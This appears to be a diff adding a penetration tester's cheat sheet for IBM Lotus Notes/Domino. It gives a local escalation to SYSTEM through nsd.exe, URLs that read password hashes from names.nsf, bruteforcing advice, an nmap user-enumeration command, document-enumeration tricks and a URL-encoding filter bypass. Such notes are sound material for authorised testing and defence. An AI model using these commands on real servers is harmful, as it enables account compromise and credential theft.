@@ -1,0 +1,170 @@
+# IBM lotus / domino server
+
+# local on Lotus Notes 8.5 or 9 (normal user to SYSTEM)
+http://reniknet.blogspot.fr/2015/01/la-cas-de-la-backdoor-incluse-dans.html
+nsd.exe -monitor
+nsd> LOAD CMD
+
+# pentest
+http://blog.nibblesec.org/2013/08/all-your-inotes-emails-are-belong-to-me.html
+http://blog.quarkslab.com/have-you-ever-played-with-domino.html
+http://www.intelligentexploit.com/articles/Hackproofing-Lotus-Domino-Web-Server.pdf
+http://seclists.org/pen-test/2008/May/64
+http://carnal0wnage.attackresearch.com/2012/08/lotus-domino-scanner.html
+http://www.sectechno.com/hacking-lotus-domino/
+http://www.securityfocus.com/archive/75/474476
+
+# admin console
+the admin console is /webadmin.nsf
+but only admins can login (if not admin but valid l/p -> 401 Unauthorized)
+so it's best to bruteforce names.nsf
+the login is case insensitive
+run os commands using the Live Console
+
+# hashes
+GET /names.nsf/$defaultview?Readviewentries
+GET /names.nsf/$defaultview/<unid e.g: 3EF1AE103E3DC17E88257CF300656249>?OpenDocument
+
+# if /names.nsf returns 500 Internal Server Error, try:
+names.nsf?Login
+
+http://seclists.org/pen-test/2007/Jul/161
+
+# fp with help/
+https://www.hpf.com.au/help/help85_admin.nsf
+https://www.hpf.com.au/help/help9_admin.nsf
+
+# tools
+http://www.exploit-db.com/exploits/3302/
+lotophagi
+https://www.exploit-db.com/exploits/39495/ (python)
+
+# user enum
+nmap -p1352 -sV --script domino-enum-users --script-args userdb=/path/to/logins.txt,domino-enum-users.path=/tmp/blah 1.2.3.4
+cat screenlog.0 | grep -E 'User ".*" found|Successfully' | grep -Eo '".*"' | tr -d '"' | sort -u
+
+# gul
+/names.nsf    => Domino Directory, contains all usernames and password hashes
+/dom.nsf      => "Web Server Configuration" might be usefull
+/domcfg.nsf   => ... SAME ...
+/log.nsf      => Notes Log
+/webadmin.nsf => domino admin page
+
+File extensions
+.nsf => Notes databases
+.box => Notes mail boxes
+.ntf => Notes databases templates
+
+Interesting paths
+lotus\domino\data             => Domino Database install path (.nsf & .ntf)
+lotus\domino\data\domino\html => Non-database data such as HTML files
+
+Database interactions:
+Actions are performed using query strings OR through ! delimiter
+ - http://server/statrep.nsf?OpenDatabase
+ - http://server/statrep.nsf!OpenDatabase
+
+Some useful commands:
+OpenServer
+OpenNavigator
+ReadEntries
+OpenView
+ReadViewEntries
+OpenDocument
+EditDocument
+CreateDocument
+DeleteDocument
+SaveDocument
+ReadDesign
+OpenForm
+ReadForm
+OpenAgent
+SearchView
+OpenIcon
+OpenAbout
+OpenHelp
+
+Usefull server commands
+   Command      |                Example      |     Description
+----------------+-----------------------------+------------------------------------------
+OpenServer      | http://server/?OpenServer   | List the databases on a Domino Server
+
+
+Useful database commands
+   Command      |                Example                              |     Description
+----------------+-----------------------------------------------------+------------------------------------------
+OpenNavigator   |                                                     | Navigate in the databases
+                | http://server/statrep.nsf/$defaultNav?OpenNavigator | List visible Views in the database
+                | http://server/statrep.nsf/home?OpenNavigator        | Navigate the home data
+                | http://server/8000000000000000/$defaultNav          | Default navigator using the database ReplicaID
+ReadEntries     | http://server/statrep.nsf?ReadEntries               | XML listing of visible views.
+                                                                      | Contains Views'  (UNID) and the views' name.
+                |                                                     | Useful if access to the default navigator is prohibited.
+
+Usefull view commands
+   Command      |                Example                         |     Description
+----------------+------------------------------------------------+------------------------------------------
+OpenView        | http://server/statrep.nsf/view?OpenView        | Not much to say here
+ReadViewEntries | http://server/statrep.nsf/view?ReadViewEntries | XML listing  of documents within a view
+ReadDesign      | http://server/statrep.nsf/view?ReadDesign      | XML listing describing the structure of the view.
+
+Usefull document commands
+   Command     |                Example                             |     Description
+---------------+----------------------------------------------------+------------------------------------------
+OpenDocument   | http://server/statrep.nsf/view/doc?OpenDocument    | Opens a document in read mode
+EditDocument   | http://server/statrep.nsf/view/doc?EditDocument    | Opens a document in write mode
+               |                                                    | If the form only allows a field
+	       |                                                    | just change the form parameters / request
+SaveDocument   | http://server/statrep.nsf/view/doc?SaveDocument    | Called by EditDocument when modifying the doc
+DeleteDocument | http://server/statrep.nsf/view/doc?DeleteDocument  | Delete documents
+CreateDocument | http://server/statrep.nsf/view/form?CreateDocument | Create a document in the database
+
+
+Useful database objects
+  Object     |                Example                              |     Description
+-------------+-----------------------------------------------------+------------------------------------------
+$defaultNav  | http://server/statrep.nsf/$defaultNav?OpenNavigator | The default navigator
+$icon        | http://server/statrep.nsf/$icon?OpenIcon            | Icon for the database
+$icon        | http://server/statrep.nsf/$icon                     | Icon for the database
+$help        | http://server/statrep.nsf/$help?OpenHelp            | Describes how to use the database
+$about       | http://server/statrep.nsf/$about?OpenAbout          | Page that tells you "about" the database
+$first       | http://server/statrep.nsf/view/$first?OpenDocument  | Opens the first document in a given view
+$defaultform | http://server/statrep.nsf/$defaultform?OpenForm     | The first form found in the database.
+
+Database Structure Enumeration
+* Enumerating Views,Forms, Agents and Special Database Objects
+
+Universal Note IDs (UNIDs): 32 character long strings.
+NoteID: Smaller ID => For any view, hidden or visible, form or agent, NoteID start ~0x11A then by 4 increment
+        Seems that NoteID are not available for databases
+
+Examples:
+ - UNID   => http://server/statrep.nsf/0a89ad68dd8b0187852561780077caf0/b937c60966dbb9dd80256a7400059cc6
+ - NoteID => http://server/statrep.nsf/11A
+
+* Enumerating Documents
+
+NoteID => For ducoments, starts at 0x8F6 then by 4 increment
+          error 500: all documents have been enumerated
+          error 404: document was deleted
+
+To get the NoteID of a document open a view with theReadViewEntries command.
+
+ - http://10.0.0.11/statrep.nsf/3.+Events/?ReadViewEntries
+
+To list all documents
+ - http://server/statrep.nsf/$Alarms/8F6 and upward by 4
+
+* Using the ReplicaID
+ReplicaID is used when databases are on multiple servers, to track modifications
+
+ReplicaID of names.nsf is 80256A7100183ABF
+ names.nsf can be called as follow:
+ - http://server/80256A7100183ABF/
+ - http://server/__80256A7100183ABF.nsf/
+ - http://server/__80256A7100183ABF.ns4/
+ - http://server/__80256A7100183ABF.box/
+
+* If filtered
+Just url encode never knows, it bypass notes recommendations
+
